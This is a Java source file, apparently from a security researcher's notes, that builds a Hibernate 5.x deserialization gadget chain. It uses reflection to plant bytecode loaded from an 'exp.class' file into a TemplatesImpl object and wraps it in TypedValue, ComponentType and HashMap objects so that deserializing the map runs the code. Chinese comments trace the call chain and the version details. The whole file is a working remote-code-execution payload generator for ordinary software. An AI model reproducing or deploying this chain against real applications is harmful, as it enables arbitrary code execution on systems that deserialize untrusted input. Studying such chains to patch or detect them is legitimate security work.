import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.hibernate.engine.spi.TypedValue;
import org.hibernate.mapping.Component;
import org.hibernate.property.access.spi.GetterMethodImpl;
import org.hibernate.tuple.component.AbstractComponentTuplizer;
import org.hibernate.tuple.component.ComponentMetamodel;
import org.hibernate.tuple.component.PojoComponentTuplizer;
import org.hibernate.type.ComponentType;
import org.hibernate.type.Type;
import util.Reflections;
import util.Reflections;
import util.Util;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
/*
* 构造链:
* HashMap.readObject
*   TypedValue.hashCode
*       ValueHolder.getValue
*           TypedValue.initialize
*               ComponentType.getHashCode
*                   PojoComponentTuplizer.getPropertyValue
*                       AbstractComponentTuplizer.getPropertyValue
*                           GetterMethodImpl.get / BasicPropertyAccessor$BasicGetter.get()
*                               TemplatesImpl.getOutputProperties
*                                   TemplatesImpl.newTransformer
*                                       TemplatesImpl.getTransletInstance
* */
/*依赖:
    Hibernate5.4.32.Final
* */
/*
* 注意点：TypedValue中的initialize函数是一个延迟函数，TypedValue中的initTransients函数执行不会直接调用initialize，
* 而是真正需要调用ValueHolder的initialize才会调用。这也就解释了为什么不能直接反序列化TypedValue，而是要序列化HashMap
*
* 低版本使用BasicPropertyAccessor$BasicGetter，高版本用GetterMethodImpl
* */
public class Hibernate1 {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates=new TemplatesImpl();
        Class templatesClass=templates.getClass();
        Field namefield=templatesClass.getDeclaredField("_name");
        namefield.setAccessible(true);
        namefield.set(templates,"dragonkeep");
        Field bytecodefield=templatesClass.getDeclaredField("_bytecodes");
        bytecodefield.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("exp.class"));
        byte[][] codes={code};
        bytecodefield.set(templates,codes);
        Field tfactoryField=templatesClass.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());

        Method method =TemplatesImpl.class.getDeclaredMethod("getOutputProperties");
        Class<?> getterImpl  = Class.forName("org.hibernate.property.access.spi.GetterMethodImpl");
        Constructor<?> constructor = getterImpl.getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        GetterMethodImpl getter = (GetterMethodImpl) constructor.newInstance(null, null, method);

        Class<?> pojoComponentTuplizerClass = Class.forName("org.hibernate.tuple.component.PojoComponentTuplizer");
        AbstractComponentTuplizer pojoComponentTuplizer= (AbstractComponentTuplizer) Reflections.createWithoutConstructor(pojoComponentTuplizerClass);
        Class<?> abstractComponentTuplizerClass =Class.forName("org.hibernate.tuple.component.AbstractComponentTuplizer");
        Field gettersField =abstractComponentTuplizerClass.getDeclaredField("getters");
        gettersField.setAccessible(true);
        Object getters = Array.newInstance(getter.getClass(), 1);
        Array.set(getters, 0, getter);
        gettersField.set(pojoComponentTuplizer,getters);

        Class<?> componentTypeClass = Class.forName("org.hibernate.type.ComponentType");
        ComponentType componentType = (ComponentType)Reflections.createWithoutConstructor(componentTypeClass);
        Field componentTypeField = componentTypeClass.getDeclaredField("componentTuplizer");
        componentTypeField.setAccessible(true);
        componentTypeField.set(componentType,pojoComponentTuplizer);
        Field propertySpanField = componentTypeClass.getDeclaredField("propertySpan");
        propertySpanField.setAccessible(true);
        propertySpanField.set(componentType,1);

        TypedValue typedValue=new TypedValue(componentType,null);

        HashMap<Object,Object> hashMap = new HashMap<>();
        hashMap.put(typedValue,"dragonkeep");
        Field valueField = TypedValue.class.getDeclaredField("value");
        valueField.setAccessible(true);
        valueField.set(typedValue, templates);

        Util.serialize(hashMap);
        Util.unserialize();


    }
}
